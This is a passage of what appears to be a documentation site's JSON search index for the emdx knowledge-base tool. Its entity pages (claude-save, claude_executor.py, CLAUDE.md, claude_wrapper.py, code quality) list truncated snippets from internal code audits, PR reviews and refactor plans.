PreToolUse event</li> <li>Detects <code>emdx save</code> commands (piped and file patterns)</li> <li> <p>Logs all save...</p> </li> <li> <p>#250 Claude-KB Competitive Analysis - Innovation Assessment   Section: What Makes Claude-KB Different</p> </li> <li> <p>#156 Claude-KB Project Recommendation - Split Strategy   Section: The Realization</p> <p>The key insight: When working with Claude Code, you need to build context through markdown files. <code>claude-save</code> makes this effortless.</p> </li> <li> <p>#176 Project Overview Documentation   Section: 2. Fish Shell Functions</p> </li> <li><code>claude-save</code> - Save markdown files to knowledge base</li> <li><code>claude-list</code> - List knowledge entries</li> <li><code>claude-find</code> - Full-text search capabilities</li> <li> <p><code>claude-view</code> - View documents wi...</p> </li> <li> <p>#150 Claude Command Structure Analysis   Section: Command Categories</p> </li> <li>claude-save - Create/Update documents from files</li> <li>claude-find - Read/Search documents</li> <li>claude-view - Read specific document</li> <li> <p>claude-list - Read all documents -...</p> </li> <li> <p>#24 Clauding Architecture Refactor Plan   Section: Directory Structure</p> <p>...\u2502   \u2514\u2500\u2500 clauding.fish          # Auto-loaded on shell start \u251c\u2500\u2500 functions/ \u2502   \u251c\u2500\u2500 claude-save.fish       # User-facing commands (one per file) \u2502   \u251c\u2500\u2500 claude-find.fish      \u2502   \u251c\u2500\u2500 claude-view.fish \u2502   \u251c\u2500\u2500 claude-recent.fish \u2502   \u251c\u2500\u2500 claude-list.fish \u2502   \u251c\u2500\u2500...</p> </li> <li> <p>#8 Claude-Save Command Issues Analysis   Section: Claude-Save Issues Analysis</p> </li> <li> <p>#11 Claude Code Agents Plugin Mode Analysis &amp; Gameplan   Section: Critical Issues Identified</p> </li> <li>Internal functions in <code>functions/_clauding_internal/</code> need to be in Fish's function path</li> <li>Dependencies broken (e.g., <code>claude-save.fish</code> depends on <code>_clauding_safe_insert</code>)</li> </ul>"},{"location":"entities/claude-save/#claude-kb-designed-for-ai-context","title":"Claude-KB: Designed for AI context","text":"<p>claude-save api-design.md \"API Design Doc\" \"backend-project\" ```</p>"},{"location":"entities/claude-save/#claude-functions-claude-functionsfish","title":"Claude Functions (<code>claude-functions.fish</code>)","text":""},{"location":"entities/claude-save/#1-core-crud-operations","title":"1. Core CRUD Operations","text":""},{"location":"entities/claude-save/#problem-summary","title":"Problem Summary","text":"<p>The <code>claude-save</code> command is failing with psql parameter errors when called through the Bash tool. The error suggests that the command is trying to pass parameters in a format that psql doesn't understand.</p>"},{"location":"entities/claude-save/#3-function-loading-issues","title":"3. Function Loading Issues","text":""},{"location":"entities/claude-save/#related-entities","title":"Related Entities","text":"<ul> <li><code>claude-view</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>~/.claude/hooks/readme.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>~/.claude/hooks/claude-save-fixer.sh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>type claude-save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>success criteria status</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>db-view</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>claude-save.fish</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>claude-note</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>claude-cmd</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>~/.claude/hooks/readme.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/claudeexecutorpy/","title":"claude_executor.py","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-01-10</p>"},{"location":"entities/claudeexecutorpy/#documents-12","title":"Documents (12)","text":"<ul> <li>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/claudeexecutorpy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...cutor/factory.py<code>|</code>detect_available_cli<code>| **NO** | no | *nowhere* | |</code>services/claude_executor.py<code>|</code>execute_cli_sync<code>| **NO** | no | *nowhere* | |</code>services/claude_executor.py<code>|</code>execute_claude_detached<code>| **NO** | re-exported in</code>init.py` but never impor...</p> <ul> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>Known dict shapes masquerading as <code>dict[str, Any]</code> \u2014 <code>synthesis_service.py</code>, <code>claude_executor.py</code>, <code>estimate_cost()</code> all return dicts with fully known keys. TypedDicts should replace these.</li> </ol> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 3. Resource Leaks</p> <ul> <li><code>claude_executor.py:160-183</code> \u2014 Log file handle not closed on exception</li> </ul> </li> <li><code>migrations.py:2224-2240</code> \u2014 Connection opened without context manager</li> <li> <p><code>cascade_service.py:97-146</code> \u2014 Infinite loop risk if process becomes zombie</p> </li> <li> <p>#6375 Codebase Bug Audit 2026-02-15 [3/10]   Section: Critical Bugs (Severity: HIGH)</p> </li> <li> <p>#6336 Move execution utilities to services layer   Section: Move Execution Utilities to Services Layer</p> <p>They belong in <code>services/</code> alongside <code>claude_executor.py</code> and <code>unified_executor.py</code>.</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Overlapping/Unclear Boundaries \u26a0\ufe0f</p> <p>...---------| | <code>unified_executor.py:1-493</code> | 493 | CLI execution with streaming | | <code>claude_executor.py:1-383</code> | 383 | Legacy Claude-specific execution | | <code>execution_service.py:1-97</code> | 97 | Facade for executions table | | <code>execution_monitor.py:1-268</code> | 268 | Process h...</p> </li> <li> <p>#6315 Delegate: Analyze CODE COMMENTS &amp; DOCUMENTATION across emdx/ (exclude  [2/15]   Section: \u2705 STRENGTHS</p> <p>...detector.py`: Documents MinHash/LSH algorithm choice and O(n) vs O(n\u00b2) tradeoff</p> </li> <li><code>claude_executor.py</code>: Explains stream-json default, module purpose, dependency architecture</li> <li><code>delegate.py</code>: Comprehensive usage examples in module docstring</li> <li> <p><code>constants.py</code>: Well-orga...</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> <p>...s()<code>| Pairwise comparison with complex scoring | | **72.6** | 161 | 7 |</code>services/claude_executor.py:224<code>|</code>execute_cli_sync()<code>| Duplicate streaming logic from unified_executor | | **69.3** | 198 | 4 |</code>commands/delegate.py:521<code>|</code>delegate()` | Many flags and exe...</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: Blocker Found &amp; Fixed</p> <p>...ites across 4 files:</p> </li> <li><code>unified_executor.py</code> (2 calls \u2014 the main delegate path)</li> <li><code>claude_executor.py</code> (3 calls \u2014 background + sync execution)</li> <li><code>task_runner.py</code> (1 call \u2014 workflow task spawning)</li> <li> <p><code>claude_wrapper.py</code> (1 call \u2014 wrapper script)</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Metrics Summary</p> <p>...ed to: /Users/alexrockwell/.claude/proj... [23:47:48] \ud83d\udcc4 Tool result: emdx/services/claude_executor.py:175:        print(f\"\\033[32m\u2705 Claude started in background (PID: {p... [23:47:50] \ud83e\udd16 Claude: Let me check for code duplication patterns and deprecated patterns: [23:4...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...or/cursor.py**: All 6 necessary</p> </li> <li>cli_executor/factory.py: All 2 necessary</li> <li>claude_executor.py: All necessary</li> <li>hybrid_search.py: 5 necessary, 1 borderline (keep)</li> <li>unified_search.py: All 7 necessary</li> <li>auto_tagger.py: All 8 necessary</li> <li>**similari...</li> </ul>"},{"location":"entities/claudeexecutorpy/#1-resource-leak-file-handle-not-closed-on-exception","title":"1. Resource Leak: File Handle Not Closed on Exception","text":"<p>File: <code>claude_executor.py:160-183</code> &amp; <code>claude_executor.py:197-210</code> Issue: In <code>execute_claude_detached()</code>, the log file handle is opened but if an exception occurs between opening and closi...</p>"},{"location":"entities/claudeexecutorpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>test mock specs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>test mock gap is the highest-risk finding</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>tasksyncresult</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>cli_executor/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/claudemd/","title":"claude.md","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2025-07-07</p>"},{"location":"entities/claudemd/#documents-12","title":"Documents (12)","text":"<ul> <li>#6614 Delegate: Update documentation to remove all references to emoji alias   Section: Changes Made </li> <li>Changed <code>utils/</code> description from \"emoji aliases\" to \"tags\"</li> <li> <p>Changed \"Documents use tags (emoji aliases)\" to \"Documents use plain text tags\"</p> </li> <li> <p>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made</p> </li> <li>Removed the <code># Dynamic discovery</code> example block</li> <li>Removed <code>--each/--do</code> from the <code>--All options:--</code> list</li> <li> <p>Removed the \"Discover + process\" row from the Quick Reference table</p> </li> <li> <p>#6809 Delegate: Fix DOC-10: Add mention of maintain.auto_link_on_save config [5/5]</p> <p>Change made: Added 2 lines to <code>CLAUDE.md</code> in the Essential Commands &gt; Maintenance section (line 279-280):</p> </li> <li> <p>#6683 CLAUDE.md delegate-aware restructure</p> <p>Project CLAUDE.md (<code>CLAUDE.md</code>):</p> </li> <li> <p>Session Start Protocol: Split into human/delegate context. Humans get manual commands; delegates are told priming happens automatically via ho...</p> </li> <li> <p>#6664 Claude Code CLAUDE.md System \u2014 Deep Architecture Research   Section: Loading Order (from system prompt to first user message)</p> <p>System Reminders Layer (injected as tagged blocks in conversation):</p> </li> <li>CLAUDE.md contents \u2014 Each file wrapped in: <code>Contents of &lt;path&gt; (&lt;type description&gt;):\\n&lt;content&gt;</code></li> <li> <p>Auto memory \u2014 First 200 lines of `~/.claude/projects//memor... <li> <p>#6663 Prime Command Redesign: External Tool Research [2/4]   Section: 6. Problems with Too Much Context</p> <p>This is the most critical finding for comparison with Claude Code's CLAUDE.md approach:</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: 12. Documentation files</p> <ul> <li><code>CLAUDE.md</code> \u2014 References <code>emdx tag legend</code>, emoji tag aliases throughout</li> </ul> </li> <li><code>docs/architecture.md</code> (line 104) \u2014 mentions <code>emoji_aliases.py</code></li> <li> <p><code>docs/testing.md</code> (line 43, 79) \u2014 references <code>test_emoji_aliases.py</code></p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Task 9: Update CLAUDE.md documentation</p> <p>File: <code>CLAUDE.md</code></p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Claude Code Integration</p> <p>From <code>CLAUDE.md</code>:</p> </li> <li><code>emdx task ready</code> - Check tasks ready to work</li> <li><code>emdx task create \"Title\" --description \"Details\"</code> - Create tasks for discovered work</li> <li> <p><code>emdx task update &lt;id&gt; -s done</code> - Mark complete</p> </li> <li> <p>#4754 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Critical Findings (Prioritized)</p> <p>...Python bindings</p> </li> <li>Well-Documented - Comprehensive docs in <code>docs/</code> folder and <code>CLAUDE.md</code> project instructions</li> <li> <p>Active Development - Recent commits focused on activity view optimization (progress bars, tokens, completion highlights)</p> </li> <li> <p>#11 Claude Code Agents Plugin Mode Analysis &amp; Gameplan   Section: Critical Issues Identified</p> </li> <li><code>source core/claude-init.fish</code> - File does not exist</li> <li><code>source core/claude-functions.fish</code> - File does not exist </li> <li>`source core/claude-direct-fixed.f...</li>"},{"location":"entities/claudemd/#claudemd_1","title":"CLAUDE.md","text":""},{"location":"entities/claudemd/#claudemd_2","title":"CLAUDE.md","text":""},{"location":"entities/claudemd/#1-outdated-documentation-vs-reality","title":"1. Outdated Documentation vs. Reality","text":"<p>Documentation Claims (CLAUDE.md):</p>"},{"location":"entities/claudemd/#related-entities","title":"Related Entities","text":"<ul> <li><code>poetry run emdx</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>no python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx tag add</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>test_emoji_aliases.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>docs/testing.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>readme.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.0)</li> <li><code>summary removed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>~/.claude/claude.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>manual</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/claudewrapperpy/","title":"claude_wrapper.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/claudewrapperpy/#documents-8","title":"Documents (8)","text":"<ul> <li>#6336 Move execution utilities to services layer   Section: Move Execution Utilities to Services Layer <ul> <li><code>utils/claude_wrapper.py</code> \u2192 <code>services/claude_wrapper.py</code></li> </ul> </li> <li> <p><code>utils/output_parser.py</code> \u2192 <code>services/output_parser.py</code></p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Code Organization Issues</p> <ol> <li>Execution support misplaced in utils/: <code>claude_wrapper.py</code>, <code>output_parser.py</code>, <code>structured_logger.py</code> belong in <code>services/</code></li> </ol> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Current State: 16 utility files</p> <p>...init__.py<code>| Module docstring | 12 | Outdated - mentions non-existent modules | |</code>claude_wrapper.py<code>| Execution wrapper script | 241 | Belongs in services/, not utils/ | |</code>datetime_utils.py<code>| Datetime parsing | 138 | Well-scoped, good | |</code>emoji_aliases.py` | Ta...</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> <p>...sting, deeply nested Claude JSON format handling | | 116.7 | 197 | 10 | <code>utils/claude_wrapper.py:40</code> | <code>main()</code> | Script-style function doing too much: validation, subprocess, output parsing, heartbeat | | 113.9 | 229 | 5 | <code>commands/core.py:340</code> | <code>find()</code>...</p> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]   Section: File-by-File Analysis</p> </li> <li>Status: Actively used (as script)</li> <li>Used via: <code>emdx/services/claude_executor.py:142</code> (subprocess call)</li> <li> <p>Notes: Run as standalone script, not imported</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: Different Execution Paths:</p> <ol> <li>task_runner.py \u2192 <code>claude_executor.execute_claude_detached()</code></li> </ol> </li> <li>Fires and forgets (uses <code>nohup</code> + detached subprocess)</li> <li>Logs to file, returns immediately with PID</li> <li> <p>Uses <code>claude_wrapper.py</code> for process management</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: Blocker Found &amp; Fixed</p> <p>...ckground + sync execution)</p> </li> <li><code>task_runner.py</code> (1 call \u2014 workflow task spawning)</li> <li> <p><code>claude_wrapper.py</code> (1 call \u2014 wrapper script)</p> </li> <li> <p>#6445 Test [2/2]   Section: Coverage Analysis by Area</p> <p>...Theme system | | <code>services/unified_search.py</code> | Unified search service | | <code>utils/claude_wrapper.py</code> | Claude API wrapper | | <code>utils/retry.py</code> | Retry utilities |</p> </li> </ul>"},{"location":"entities/claudewrapperpy/#16-claude_wrapperpy","title":"16. <code>claude_wrapper.py</code>","text":""},{"location":"entities/claudewrapperpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ui/formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task_runner.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>get_subprocess_env()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>file_size.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>emdx/services/unified_executor.py:210</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>output_parser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>utils/output_parser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>utils/emoji_aliases.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>title_normalization.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>text_formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/code-quality/","title":"code quality","text":"<p>Type: heading | Mentioned in: 21 documents | First seen: 2025-07-07</p>"},{"location":"entities/code-quality/#documents-21","title":"Documents (21)","text":"<ul> <li>#6553 Delegate: Review PR #656 using 'gh pr view 656' and 'gh pr diff 656'.  [4/6]   Section: Review Findings </li> <li>\u2705 All 35 tests pass</li> <li>\u2705 ruff check passes (no linting issues)</li> <li> <p>\u2705 Well-structured test organization by functionality</p> </li> <li> <p>#6405 Bug Fix PR Reviews [4/6]</p> <p>\u26a0\ufe0f Backward Compatibility (Minor Issue)</p> </li> <li>Status: PARTIAL - Missing explicit migration</li> <li>Old format: <code>similarity_cache.pkl</code> (single file)</li> <li>New format: <code>similarity_cache/</code> (directory with metadata.json + tfidf_matrix.npz)</li> <li> <p>**Current beha...</p> </li> <li> <p>#6400 Bug Fix PR Reviews [2/6]   Section: 4. Are there any migration edge cases missed?</p> </li> <li>Changes are minimal and focused</li> <li>Error handling pattern is correct</li> <li> <p>No ruff violations expected</p> </li> <li> <p>#6347 Tech Debt Campaign - FINAL RESULTS   Section: Final Scorecard: 19 PRs Merged</p> </li> <li>\u2705 DEBT-6: Removed dead code / unused imports (PR #517)</li> <li>\u2705 DEBT-8: Standardized CLI interfaces (PR #521)</li> <li>\u2705 DEBT-28: O(n^2) duplicate detection fix (merged)</li> <li> <p>\u2705 DEBT-14 + extras: ~900 ruff violations fixed (PRs #560, #566)</p> </li> <li> <p>#6148 Delegate: Review PR #449 (Dream Journal). Run: gh pr diff 449. Check c [3/7]</p> </li> </ul> Gameplan Requirement Status Notes Duplicate detection pass \u2705 Uses <code>find_all_duplicate_pairs()</code> from existing SimilarityService Pattern detection \u2705 Cross-... <ul> <li> <p>#6146 Delegate: Review PR #446 (Smart Priming). Run: gh pr diff 446. Check c [1/7]   Section: Verdict</p> <p>Approve with conditions: Code quality is good, matches gameplan well. Add basic test coverage before merge.</p> </li> <li> <p>#6147 Delegate: Review PR #452 (Auto-Linking). Run: gh pr diff 452. Check co [5/7]   Section: Verdict</p> <p>APPROVE with minor comments:</p> </li> <li>Feature matches gameplan #6098 accurately</li> <li>Code quality is good</li> <li>Missing tests is the main gap, but not blocking for an internal tool</li> <li> <p>Depth calculation bug is minor edge case</p> </li> <li> <p>#18 Clauding Project Gameplan - Updated   Section: Technical Debt</p> <ol> <li>Code Quality</li> </ol> </li> <li>Add comprehensive logging</li> <li>Implement debug mode</li> <li>Code coverage metrics</li> <li>Static analysis integration</li> <li> <p>Documentation generation</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]</p> <p>Fix service types in ask_service.py, unified_search.py, embedding_service.py, file_watcher.py:</p> </li> <li>Replace <code>Any</code> with actual types using <code>TYPE_CHECKING</code> blocks</li> <li> <p>Total: 14 occurrences</p> </li> <li> <p>Create <code>VimEditorHost</code> Protocol for text_areas.py,...</p> </li> <li> <p>#6488 Any Type Removal Analysis [1/5]   Section: Implementation Priority</p> </li> <li>Timer and LogStream types \u2014 Replace <code>Any</code> with actual imported types</li> <li> <p>RichLog parameter types \u2014 Straightforward replacement</p> </li> <li> <p>#6299 Delegate: DEBT-26: Fix weak assertions in test_execution_system.py spe   Section: Changes Made</p> </li> <li>Removed excessive print statements (tests should use assertions, not prints)</li> <li>Added <code>strip_ansi()</code> utility function for parsing colored CLI output</li> <li> <p>Cleaned up main() function for manual debugging use</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Recommended Action Plan</p> </li> <li>Expand CI Python matrix to [3.11, 3.12, 3.13]</li> <li>Add linting and type checking to CI</li> <li>Replace silent exception handlers with logging</li> <li> <p>Standardize ID...</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: Recommended Action Plan</p> </li> <li>Proper exception handling with chaining</li> <li>Add type hints to commands</li> <li>Replace global state patterns</li> <li> <p>Remove deprecated function</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: Overall Health Score</p> <p>...ode Organization | \u26a0\ufe0f Moderate | \u2192 Stable | | Dependencies | \u2705 Good | \u2192 Stable | | Code Quality | \u2705 Good | \u2191 Improving | | Async Patterns | \u2705 Good | \u2192 Stable |</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]</p> <p>ASSIGNED BUT NEVER USED VARIABLES</p> </li> <li> <p><code>emdx/ui/browser_container.py:158</code> - <code>conflicts</code></p> </li> <li><code>emdx/utils/git_ops.py:706</code> - <code>result</code></li> <li><code>emdx/utils/git_ops.py:741</code> - <code>result</code></li> <li><code>emdx/models/executions.py:194</code> - <code>cursor</code></li> <li> <p><code>emdx/models/executions.py:264</code> - `...</p> </li> <li> <p>#6181 Delegate: Audit emdx/services/ for dead code. For EACH of the 22 files [2/17]   Section: RECOMMENDED ACTIONS</p> </li> <li>Remove unused import <code>datetime</code> from document_executor.py (if file kept)</li> <li> <p>Remove unused import <code>DEFAULT_CLAUDE_MODEL</code> from document_executor.py (if file kept)</p> </li> <li> <p>#6153 PR Review Sprint: Smart Ops Synthesis   Section: Overview</p> <p>Reviewed 6 PRs implementing the EMDX \"Smart Ops\" feature set. All PRs align well with their respective gameplans, demonstrating good architectural consistency and code quality.</p> </li> <li> <p>#6149 Delegate: Review PR #451 (Knowledge Decay). Run: gh pr diff 451. Check [4/7]   Section: Verdict: \ud83d\udc4d APPROVE with minor note</p> <p>Code quality and gameplan compliance are good. The missing unit tests are a minor gap but manual testing confirms functionality. Would recommend adding tests as follow-up work.</p> </li> <li> <p>#3073 Tech Debt Epic &amp; Task Breakdown</p> <p>Atomic PRs: Each task = 1 PR for easy review/merge</p> </li> </ul>"},{"location":"entities/code-quality/#code-quality_1","title":"Code Quality","text":""},{"location":"entities/code-quality/#code-quality_2","title":"Code Quality","text":""},{"location":"entities/code-quality/#code-quality_3","title":"Code Quality","text":""},{"location":"entities/code-quality/#gameplan-alignment-vs-6101","title":"Gameplan Alignment (vs #6101)","text":""},{"location":"entities/code-quality/#medium-priority-code-quality","title":"Medium Priority (Code Quality)","text":""},{"location":"entities/code-quality/#5-code-quality","title":"5. Code Quality","text":""},{"location":"entities/code-quality/#phase-3-code-quality-2-weeks","title":"Phase 3: Code Quality (2 weeks)","text":""},{"location":"entities/code-quality/#phase-2-code-quality-1-week","title":"Phase 2: Code Quality (1 week)","text":""},{"location":"entities/code-quality/#low-priority-code-quality","title":"LOW PRIORITY - Code Quality","text":""},{"location":"entities/code-quality/#epic-1-quick-wins-priority-1-all-parallel","title":"Epic 1: Quick Wins (Priority 1) - All Parallel","text":"<p>These can ALL run simultaneously - no file overlap. | Task ID | Title | Files | Effort | Parallelizable | |---------|-------|-------|-----...</p> <ul> <li>#247 Clauding Implementation Plan - Critical Issues Resolution   Section: Implementation Timeline <p>Week 3:</p> </li> <li>Complete P2 performance work</li> <li>Begin P3 code quality improvements</li> </ul>"},{"location":"entities/code-quality/#related-entities","title":"Related Entities","text":"<ul> <li><code>\ud83d\udd04 known issues</code> 